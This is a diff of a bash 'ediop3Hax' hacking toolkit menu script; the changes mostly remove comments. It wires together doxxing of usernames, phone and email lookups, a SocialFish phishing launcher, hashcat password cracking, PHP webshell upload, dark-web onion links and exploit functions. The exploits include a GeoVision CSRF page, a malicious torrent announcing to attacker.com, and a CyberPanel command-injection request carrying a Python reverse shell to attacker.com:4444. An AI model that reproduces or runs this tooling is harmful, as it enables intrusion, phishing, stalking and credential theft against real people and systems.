@@ -1,21 +1,18 @@
 #!/bin/bash
 
-# Colors
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[0;33m'
 BLUE='\033[0;34m'
 CYAN='\033[0;36m'
-NC='\033[0m' # No Color
+NC='\033[0m' 
 
-# Global Variables
 TOOLS_DIR="$HOME/ediop3Hax"
 WEBSHELL_DIR="/webshells/php"
 SQLMAP_DIR="$TOOLS_DIR/sqlmap"
 SOCIALFISH_DIR="$TOOLS_DIR/SocialFish"
 OSINTGRAM_DIR="$TOOLS_DIR/Osintgram"
 
-# Banner
 show_banner() {
     clear
     echo -e "${RED}"
@@ -57,12 +54,10 @@ show_banner() {
     echo -e "${NC}"
 }
 
-# Check and install dependencies
 check_dependencies() {
     local deps=("git" "curl" "wget" "nmap" "php" "python3" "whois" "jq" "pip3")
     local missing=()
     
-    # Check Termux environment
     local is_termux=false
     [[ -f "/data/data/com.termux/files/usr/bin/pkg" ]] && is_termux=true
 
@@ -88,7 +83,6 @@ check_dependencies() {
         fi
     fi
 
-    # Install holehe with pip3
     if ! command -v holehe &>/dev/null; then
         echo -e "${YELLOW}[*] Installing holehe via pip3...${NC}"
         pip3 install holehe || {
@@ -96,7 +90,6 @@ check_dependencies() {
         }
     fi
     
-    # Install hashcat if not Termux
     if ! $is_termux && ! command -v hashcat &>/dev/null; then
         echo -e "${YELLOW}[*] Installing hashcat...${NC}"
         sudo apt-get install -y hashcat || {
@@ -105,7 +98,6 @@ check_dependencies() {
     fi
 }
 
-# Clone tools from GitHub
 clone_tools() {
     mkdir -p "$TOOLS_DIR"
     
@@ -123,11 +115,9 @@ clone_tools() {
         fi
     done
 
-    # Verify tool paths
     verify_tool_paths
 }
 
-# Verify tool paths
 verify_tool_paths() {
     echo -e "${YELLOW}[*] Verifying tool paths...${NC}"
     
@@ -137,7 +127,6 @@ verify_tool_paths() {
     [ ! -d "$WEBSHELL_DIR" ] && echo -e "${RED}[!] PHP backdoors not found at $WEBSHELL_DIR${NC}"
 }
 
-# ========== NETWORK SCANNER FUNCTIONS ==========
 sql_vuln_scan() {
     echo -e "${YELLOW}[*] Enter target URL (e.g., http://example.com):${NC}"
     read -r target
@@ -182,13 +171,11 @@ ip_pinger() {
     ping -c 5 "$target"
 }
 
-# ========== OSINT FUNCTIONS ==========
 dox_create() {
     echo -e "${RED}[!] This tool is for educational purposes only${NC}"
     echo -e "${YELLOW}[*] Enter target username:${NC}"
     read -r username
     
-    # Update and run Osintgram
     if [ ! -d "$OSINTGRAM_DIR" ]; then
         echo -e "${YELLOW}[*] Installing Osintgram...${NC}"
         git clone https://github.com/Datalux/Osintgram.git "$OSINTGRAM_DIR" || {
@@ -228,7 +215,6 @@ username_tracker() {
     echo -e "${YELLOW}[*] Enter username to track:${NC}"
     read -r username
     
-    # Same update/install logic as dox_create
     if [ ! -d "$OSINTGRAM_DIR" ]; then
         echo -e "${YELLOW}[*] Installing Osintgram...${NC}"
         git clone https://github.com/Datalux/Osintgram.git "$OSINTGRAM_DIR" || {
@@ -264,15 +250,12 @@ email_lookup() {
 
     echo -e "${YELLOW}[*] Checking email on public websites...${NC}"
     
-    # Check HaveIBeenPwned
     echo -e "\n${CYAN}[*] HaveIBeenPwned:${NC}"
     curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/$email" | jq
     
-    # Check Hunter.io via public page
     echo -e "\n${CYAN}[*] Hunter.io:${NC}"
     curl -s "https://hunter.io/email-verifier/$email" | grep -E "is valid|is not valid"
-    
-    # Check EmailRep.io
+     
     echo -e "\n${CYAN}[*] EmailRep.io:${NC}"
     curl -s "https://emailrep.io/$email" | jq
 }
@@ -283,16 +266,13 @@ phone_lookup() {
     [ -z "$phone" ] && return
 
     echo -e "${YELLOW}[*] Checking phone number on public websites...${NC}"
-    
-    # Check Numverify via public API
+
     echo -e "\n${CYAN}[*] Numverify:${NC}"
     curl -s "https://numverify.com/php_helper_scripts/phone_api.php?secret_key=demo&number=$phone" | jq
-    
-    # Check Truecaller public search
+
     echo -e "\n${CYAN}[*] Truecaller search:${NC}"
     curl -s "https://www.truecaller.com/search/international/$phone" | grep -E "name|gender|address"
-    
-    # Check sync.me
+
     echo -e "\n${CYAN}[*] Sync.me search:${NC}"
     curl -s "https://sync.me/search/?number=$phone" | grep -A5 "search-result__name"
 }
@@ -304,22 +284,17 @@ ip_lookup() {
 
     echo -e "${YELLOW}[*] Checking IP on public websites...${NC}"
     
-    # IP-API.com
     echo -e "\n${CYAN}[*] IP-API.com:${NC}"
     curl -s "http://ip-api.com/json/$ip" | jq
-    
-    # AbuseIPDB
+
     echo -e "\n${CYAN}[*] AbuseIPDB:${NC}"
     curl -s "https://www.abuseipdb.com/check/$ip" | grep -A10 "IP Abuse Reports"
-    
-    # VirusTotal
+
     echo -e "\n${CYAN}[*] VirusTotal:${NC}"
     curl -s "https://www.virustotal.com/ui/ip_addresses/$ip" | jq
 }
 
-# ========== UTILITIES ==========
 phishing_attack() {
-    # Check if SocialFish is already installed
     if [ ! -d "$SOCIALFISH_DIR" ]; then
         echo -e "${YELLOW}[*] Cloning SocialFish...${NC}"
         git clone https://github.com/UndeadSec/SocialFish.git "$SOCIALFISH_DIR" || {
@@ -328,7 +303,6 @@ phishing_attack() {
         }
     fi
 
-    # Install requirements
     echo -e "${YELLOW}[*] Installing Python requirements...${NC}"
     cd "$SOCIALFISH_DIR" || {
         echo -e "${RED}[!] Failed to enter SocialFish directory${NC}"
@@ -339,7 +313,6 @@ phishing_attack() {
         return
     }
 
-    # Generate and set random secret key
     echo -e "${YELLOW}[*] Generating and setting secret key...${NC}"
     SECRET_KEY=$(openssl rand -hex 32)
     sed -i "s/APP_SECRET_KEY = '<CHANGE ME SF>'/APP_SECRET_KEY = '$SECRET_KEY'/" "$SOCIALFISH_DIR/core/config.py" || {
@@ -347,7 +320,6 @@ phishing_attack() {
         return
     }
 
-    # Start SocialFish
     echo -e "${GREEN}[+] SocialFish setup complete! Starting...${NC}"
     python3 SocialFish.py
 }
@@ -363,7 +335,6 @@ password_cracker() {
     echo -e "${YELLOW}[*] Enter wordlist path (press Enter for default rockyou.txt):${NC}"
     read -r wordlist
     
-    # Set default wordlist path
     if [ -z "$wordlist" ]; then
         if [[ -f "/data/data/com.termux/files/usr/bin/pkg" ]]; then
             wordlist="$PREFIX/share/wordlists/rockyou.txt"
@@ -455,9 +426,9 @@ dark_web_links() {
     echo -e "${YELLOW}[*] Loading dark web links...${NC}"
     echo -e "${RED}Warning: These links may be illegal to access in your country${NC}"
     echo ""
-    echo "http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion"  # Uncensored Hidden Wiki
-    echo "http://darkzzx4avcsuofgfez5zq75cqc4mprjvfqywo45dfcaxrwqg6qrlfid.onion"   # Dark Web Links
-    echo "http://tor66sewebgixwhcqfnp5inzp5x5uohhdy3kvtnyfxc2e5mxiuh34iid.onion"   # Fresh Onions
+    echo "http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion" 
+    echo "http://darkzzx4avcsuofgfez5zq75cqc4mprjvfqywo45dfcaxrwqg6qrlfid.onion"
+    echo "http://tor66sewebgixwhcqfnp5inzp5x5uohhdy3kvtnyfxc2e5mxiuh34iid.onion"
 }
 
 ip_generator() {
@@ -467,7 +438,6 @@ ip_generator() {
     done
 }
 
-# ========== EXPLOITS ==========
 auto_webshell_upload() {
     echo -e "${YELLOW}[*] Choose PHP payload source:${NC}"
     echo "1) Use built-in payloads"
@@ -512,7 +482,6 @@ geovision_exploit() {
     read -r target
     echo -e "${YELLOW}[*] Exploiting GeoVision GV-ASManager CSRF...${NC}"
     
-    # Create malicious HTML file
     cat > csrf_exploit.html <<EOL
 <html>
   <body>
@@ -537,8 +506,7 @@ qbittorrent_exploit() {
     echo -e "${YELLOW}[*] Enter target IP:port (e.g., 192.168.1.100:8080):${NC}"
     read -r target
     echo -e "${YELLOW}[*] Running qBittorrent MITM RCE...${NC}"
-    
-    # Generate malicious torrent file
+
     cat > malicious.torrent <<EOL
 d8:announce41:http://attacker.com:1337/announce.php13:creation datei1653047040e4:infod6:lengthi0e4:name30:malicious_payload_executable.exe12:piece lengthi32768e6:pieces0:ee
 EOL
@@ -564,8 +532,7 @@ cyberpanel_exploit() {
     echo -e "${YELLOW}[*] Enter target URL (e.g., http://example.com:8090):${NC}"
     read -r target
     echo -e "${YELLOW}[*] Running CyberPanel RCE...${NC}"
-    
-    # Exploit command injection vulnerability
+
     echo -e "${YELLOW}[*] Testing command injection...${NC}"
     curl -X POST "$target/api/runCommand" -d "command=id"
     
@@ -574,7 +541,6 @@ cyberpanel_exploit() {
     curl -X POST "$target/api/runCommand" -d "command=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
 }
 
-# ========== MAIN FUNCTION ==========
 main() {
     check_dependencies
     clone_tools
@@ -620,5 +586,4 @@ main() {
     done
 }
 
-# Start the script
 main
